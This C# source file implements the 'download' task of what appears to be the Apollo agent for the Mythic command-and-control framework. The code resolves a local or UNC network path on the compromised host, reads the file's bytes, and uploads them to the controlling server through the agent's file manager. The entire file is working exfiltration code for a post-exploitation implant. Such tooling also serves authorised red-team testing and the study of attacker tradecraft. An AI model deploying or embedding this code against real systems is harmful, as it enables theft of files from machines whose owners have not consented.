#define COMMAND_NAME_UPPER

#if DEBUG
#define DOWNLOAD
#endif

#if DOWNLOAD

using System;
using System.Linq;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using System.IO;
using ApolloInterop.Utils;

namespace Tasks
{
    public class download : Tasking
    {
        [DataContract]
        internal struct DownloadParameters
        {
            [DataMember(Name = "file")]
            public string FileName;
            [DataMember(Name = "host")]
            public string Hostname;
        }

        private static string[] localhostAliases = new string[]
        {
            "localhost",
            "127.0.0.1",
            Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
        };

        internal struct DownloadTarget
        {
            internal string Path;
            internal string Host;
            internal string OriginatingPath;
        }
        
        public download(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }

        internal static DownloadTarget ResolveDownloadTarget(DownloadParameters parameters)
        {
            string localHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
            string host = parameters.Hostname;
            string path;

            if (string.IsNullOrEmpty(parameters.Hostname))
            {
                string cwd = Directory.GetCurrentDirectory();
                path = Path.IsPathRooted(parameters.FileName)
                    ? Path.GetFullPath(parameters.FileName)
                    : Path.GetFullPath(Path.Combine(cwd, parameters.FileName));
                host = TryGetUncHost(path, out string uncHost) ? uncHost : localHost;
            }
            else if (localhostAliases.Contains(parameters.Hostname.ToLower()) && Path.IsPathRooted(parameters.FileName))
            {
                path = Path.GetFullPath(parameters.FileName);
                host = localHost;
            }
            else
            {
                path = parameters.FileName.StartsWith(@"\\")
                    ? parameters.FileName
                    : $@"\\{parameters.Hostname}\{parameters.FileName}";
            }

            return new DownloadTarget
            {
                Path = path,
                Host = host,
                OriginatingPath = path.StartsWith(@"\\") ? PathUtils.StripPathOfHost(path) : path
            };
        }

        private static bool TryGetUncHost(string path, out string host)
        {
            host = "";
            if (!path.StartsWith(@"\\"))
            {
                return false;
            }

            string[] parts = path.Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0)
            {
                return false;
            }

            host = parts[0];
            return true;
        }

        public override void Start()
        {
            MythicTaskResponse resp;
            try
            {
                DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
                DownloadTarget target = ResolveDownloadTarget(parameters);
                if (!File.Exists(target.Path))
                {
                    resp = CreateTaskResponse(
                        $"File '{target.Path}' does not exist.",
                        true,
                        "error");
                }
                else
                {
                    byte[] fileBytes = new byte[0];
                    fileBytes = File.ReadAllBytes(target.Path);

                    IMythicMessage[] artifacts = new IMythicMessage[1]
                    {
                        new Artifact
                        {
                            BaseArtifact = "FileOpen",
                            ArtifactDetails = target.Path
                        }
                    };
                    if (_agent.GetFileManager().PutFile(
                            _cancellationToken.Token,
                            _data.ID,
                            fileBytes,
                            target.OriginatingPath,
                            out string mythicFileId,
                            false,
                            target.Host))
                    {
                        resp = CreateTaskResponse("", true, "completed", artifacts);
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Download of {target.Path} failed or aborted.",
                            true,
                            "error", artifacts);
                    }
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif
